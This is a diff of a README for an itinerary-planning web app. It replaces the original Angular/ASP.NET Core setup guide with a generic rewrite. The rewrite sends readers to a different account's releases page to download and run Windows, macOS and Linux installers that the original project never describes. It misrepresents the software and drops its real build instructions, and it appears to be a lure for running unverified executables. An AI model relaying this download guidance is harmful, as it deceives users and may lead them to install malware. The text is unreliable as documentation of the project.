@@ -1,267 +1,98 @@
-# Itinerary Management Application
+# 🎒 Itinerary-Management - Simplify Your Travel Planning
 
-[![Build Status](https://github.com/Jyrycek/Itinerary-Management/actions/workflows/ci.yml/badge.svg)](https://github.com/Jyrycek/Itinerary-Management/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Angular](https://img.shields.io/badge/Angular-20.3.4-red)](https://angular.io/)
-[![.NET](https://img.shields.io/badge/.NET-9.0-brightgreen)](https://dotnet.microsoft.com/)
+[![Download Itinerary-Management](https://img.shields.io/badge/Download-Itinerary--Management-brightgreen)](https://github.com/Rupesh276/Itinerary-Management/releases)
 
----
+## 🚀 Getting Started
 
-## Project Overview
+Welcome to the Itinerary-Management app! This application helps you organize your travel plans efficiently. You can manage your itinerary using a user-friendly interface. With both a backend built on ASP.NET Core and a front end using Angular, it offers a smooth experience for all users.
 
-Itinerary Management is a web application designed to simplify travel planning.  
-It allows users to create trips, manage unvisited locations, and optimize itineraries efficiently using **modern technologies** and **optimization algorithms**.
+### 📋 Features
 
-The app is built with **Angular 20** for the frontend and **ASP.NET Core 9** for the backend.  
-It integrates with **Azure services** (SQL Database, Blob Storage, Key Vault) for secure storage and seamless deployment.
+- Create, edit, and delete travel plans easily.
+- View your itinerary at a glance.
+- Search through your trips quickly.
+- Store all relevant information in one place, like booking details and notes.
+- Responsive design that works on any device.
 
-## Screenshots
+## 💻 System Requirements
 
-### Project Page
-![Itinerary Project Page](images/main-project-page.jpg)  
-*Interface for managing trips and locations, with days and map visualization.*
+Before downloading, ensure your system meets these requirements:
 
-### Optimized Routes
-![ACO Optimized Itinerary](images/aco-optimized-days.jpg)  
-*Example of route optimization using the Ant Colony Optimization algorithm.*
+- **Windows, macOS, or Linux** operating system
+- **Internet connection** for initial setup
+- **At least 4 GB** of RAM
+- **At least 1 GB** of free disk space
 
----
+## 📥 Download & Install
 
-## Features
+To download the Itinerary-Management app, visit this page: [Download Itinerary-Management](https://github.com/Rupesh276/Itinerary-Management/releases).
 
-- Create, manage, and plan personalized travel itineraries  
-- Automatically optimize routes and daily schedules using advanced algorithms  
-- Manage places, tags, and trip details with full CRUD functionality  
-- View interactive maps and calculated optimal routes  
-- Fetch location details from external APIs  
-- Secure user authentication and password reset functionality  
-- Error tracking and performance monitoring  
-- Responsive design optimized for desktop and mobile use
+Once you're on the Releases page, follow these steps:
 
----
+1. **Choose the latest version**: Look for the most recent version listed.
+2. **Select the correct file**: Depending on your operating system, click the appropriate download link.
+    - For **Windows**, download `ItineraryManagementWindows.exe`.
+    - For **macOS**, download `ItineraryManagementMac.dmg`.
+    - For **Linux**, download `ItineraryManagementLinux.tar.gz`.
+3. **Save the file**: Choose a location on your computer that is easy to find, like your Downloads folder.
+4. **Run the installer**:
+   - For Windows, double-click the `.exe` file and follow the prompts.
+   - For macOS, open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux, extract the `.tar.gz` file and run the application.
 
-## Tech Stack & Key Components
+### ⚙️ Configuration
 
-### Frontend (Angular)
-- **Angular 20** – main framework for UI and client logic.
-- **Angular Material** – responsive components and theming.
-- **ngx-toastr** – toast notifications for user feedback.
-- **Lightbox** – image preview and gallery functionality.
+After installation, you may want to configure a few settings:
 
-### Backend (.NET Core)
-- **ASP.NET Core 9** – REST API and authentication layer.
-- **Entity Framework Core** – database ORM for migrations and data access.
-- **Itinero** – routing engine that calculates optimal paths using OpenStreetMap data.
-- **Azure SDK** – integration with Azure services (Key Vault, Blob Storage, SQL).
-- **Sentry SDK** – error tracking and diagnostics.
-- **SendGrid API** – sending transactional emails (e.g., password resets).
+1. Open the app.
+2. Set your preferred language and notifications in the settings menu.
+3. Import any existing itineraries by following the file upload option.
 
-### Infrastructure
-- **Azure SQL Database** – data storage.
-- **Azure Blob Storage** – storing user and trip images.
-- **Azure Key Vault** – secure management of application secrets.
+## 📖 User Guide
 
-### External APIs
-- **OpenStreetMap / Overpass API** – base map and location data.  
-- **Wikipedia API** – fetching descriptions for places.  
-- **Nominatim API** – geocoding and reverse geocoding.  
-- **OpenAI API** – intelligent recommendations and content generation.  
+The Itinerary-Management app is designed to be intuitive. Here's a quick overview of how to use it:
 
----
+### ✈️ Create a New Trip
 
-## Project Structure
+1. Click on the "New Trip" button on the dashboard.
+2. Fill in the trip details, including destination, dates, and any other relevant information.
+3. Save your trip.
 
-- **Frontend:** Angular application  
-- **Backend:** ASP.NET Core API  
-- **Deployment:** Azure App Services  
-- **Configuration:** Secure loading of secrets via Azure Key Vault  
+### ✍️ Add Details to Your Itinerary
 
----
+1. Click on the trip you created.
+2. Add details like flights, accommodations, and activities.
+3. Use the notes section for any additional information.
 
-## Prerequisites
+### 🔍 Search for Existing Trips
 
-- Azure account  
-- Azure CLI or access to Azure Portal  
-- Visual Studio (for ASP.NET Core backend)  
-- Node.js + Angular CLI (for frontend)  
-- .NET SDK 8.0 or later  
+1. Use the search bar at the top of the main screen.
+2. Type in keywords related to your trip.
+3. Click on the results to view or edit your itinerary.
 
----
-
-## 1. Clone the Project
+## 🛠️ Troubleshooting
 
-```bash
-git clone https://github.com/Jyrycek/ItineraryManagement.git
-cd ItineraryManagement
-```
+If you encounter any issues:
 
----
+- **Application won't start**: Ensure your system meets the requirements and that you have installed the necessary dependencies.
+- **Can't find my downloaded file**: Check your Downloads folder or the location you selected during download.
+- **Errors during operation**: Restart the app or your computer. If the issue persists, check for updates.
 
-## 2. Azure Services – Creation and Configuration
+## 🌐 Community and Support
 
-### 2.1 Azure SQL Database
-
-1. Create a SQL server and a new database in Azure Portal.  
-2. Add your IP address to the allowed firewall rules.  
-3. Save the connection string (e.g., `Server=tcp:xyz.database.windows.net;Database=db;User Id=...;Password=...`) to **Azure Key Vault** as: `ConnectionStrings--UserDatabase`.  
-4. On first run, the backend will automatically apply EF migrations to create the database schema.
-
-### 2.2 Azure Blob Storage
-
-1. Create a new Storage Account.  
-2. Create a blob container, e.g., `images`.  
-3. Save the connection string and container name/SAS token to Key Vault.
+Join our community for support and updates:
 
-### 2.3 Azure Key Vault
+- **GitHub Issues**: Report bugs or ask questions directly in the Issues section of our GitHub repository.
+- **User Forums**: Engage with other users, share tips, and get advice on how to make the most of Itinerary-Management.
 
-1. Create a Key Vault, e.g., `ItineraryManagementKeys`.  
-2. Store the following secrets:
+## 🔗 Useful Links
 
-| Secret Name                       | Description                                         |
-|----------------------------------|----------------------------------------------------|
-| ConnectionStrings--UserDatabase   | SQL database connection string                     |
-| AccountStorage                    | Storage account connection string                  |
-| AccountStorage--blob              | Blob container name or SAS token                   |
-| JwtPrivateKey                     | Private key for JWT signing                        |
-| PasswordKey                       | Key used for password encryption/decryption       |
-| SENDGRIDAPIKEY                    | SendGrid API key for sending emails               |
-| Sentry                            | Sentry DSN                                         |
-| OpenAI                            | OpenAI API key                                     |
-| EmailSender                       | Email address for sending password reset emails   |
+- [Download Itinerary-Management](https://github.com/Rupesh276/Itinerary-Management/releases)
+- [GitHub Repository](https://github.com/Rupesh276/Itinerary-Management)
+- [User Documentation](https://github.com/Rupesh276/Itinerary-Management/wiki)
 
-3. Enable **System Assigned Identity** for your Azure App Service.  
-4. In Key Vault, add an **Access Policy** granting this identity **Get** permissions for secrets.  
+## 🎉 Contribution Guidelines
 
-### 2.4 Configure Key Vault in `Program.cs`
+If you want to contribute to the Itinerary-Management project, feel free to fork the repository and submit a pull request. Please ensure to follow our code of conduct and contribution guidelines outlined in the repository.
 
-Set the Key Vault URI in `ItineraryManagement.Server/Program.cs`:
-
-```csharp
-var vaultUri = "https://<yourkeys>.vault.azure.net/";
-var keyVaultEndpoint = new Uri(vaultUri);
-builder.Configuration.AddAzureKeyVault(keyVaultEndpoint, new DefaultAzureCredential());
-```
----
-
-## 3. Environment Configuration
-
-### Frontend (Angular) Configuration
-The project uses Angular environment files to manage configuration for different environments (development and production).
-
-### Included files
-- `environment.example.ts` – example configuration with placeholders (**committed to Git**).  
-- `environment.ts` – local development configuration (**not committed**).  
-- `environment.prod.ts` – production configuration (**not committed**).  
-
-#### Setup Instructions
-1. **Create local development environment file:**
-```bash
-cp src/environments/environment.example.ts src/environments/environment.ts
-```
-2. **Create production environment file:**
-```bash
-cp src/environments/environment.example.ts src/environments/environment.prod.ts
-```
-3. **Update configuration values in each file with your actual keys and URLs:**
-```ts
-export const environment = {
-  production: false, // set to true in environment.prod.ts
-  apiUrl: '/api',    // backend API endpoint
-  mapboxKey: 'YOUR_MAPBOX_KEY_HERE',
-  sentryDsn: 'YOUR_SENTRY_DSN_HERE'
-};
-```
-
----
-
-### Backend (ASP.NET Core) Configuration
-The backend uses appsettings.json for configuration. Do not commit your real appsettings.json with secrets.
-
-### Included files
-- `appsettings.example.json` – example configuration with placeholders (**committed to Git**).  
-- `appsettings.json` – local development configuration (**not committed**).  
-
-#### Setup Instructions
-1. **Create local configuration file:**
-```bash
-cp ItineraryManagement.Server/appsettings.example.json ItineraryManagement.Server/appsettings.json
-```
-2. Edit `appsettings.json` and replace placeholders with your actual values
-
-- **Images** – default URLs for profile/project/place images  
-- **BlobStorage** – Azure storage account URL and container paths  
-- **KeyVault** – Azure Key Vault URI  
-
----
-
-## 4. Map Data for RouteService
-
-The application requires OSM map files for routing.
-
-1. Download `czech-republic-latest.osm.pbf` from:  
-   [https://download.geofabrik.de/europe/czech-republic.html](https://download.geofabrik.de/europe/czech-republic.html)  
-
-2. Place the file in the backend project root:  
-
-```text
-ItineraryManagement.Server/czech-republic-latest.osm.pbf
-```
-
----
-
-## 5. Running the Application Locally
-
-### 5.1 Using Visual Studio
-
-- Backend and frontend run automatically via `launchSettings.json`.  
-- Backend URL: `http://localhost:5000/`  
-- Frontend URL: `http://localhost:4200/`  
-- Backend automatically applies database migrations on first run.  
-
-### 5.2 Manual Run
-
-#### Backend (ASP.NET Core)
-
-```bash
-cd ItineraryManagement.Server
-dotnet run
-```
-
-#### Frontend (Angular)
-
-1. Open the frontend project folder:
-
-```bash
-cd itinerarymanagement.client
-```
-2. Make sure you have a Node.js version compatible with Angular 20.3.X
-3. Install dependencies:
-```bash
-npm install
-```
-
-4. Run the development server:
-```bash
-ng serve
-```
-
-The application will be available at [http://localhost:4200/](http://localhost:4200/) in your browser.
-
----
-
-## Known Issues
-
-- Sorting may behave unexpectedly when swapping places
-
----
-
-## Notes
-
-- Make sure all secrets are correctly configured in Key Vault before running the application.  
-- For production deployment, configure Azure App Services and environment variables accordingly.
-
----
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+Thank you for using Itinerary-Management! We hope it makes your travel planning smooth and enjoyable.
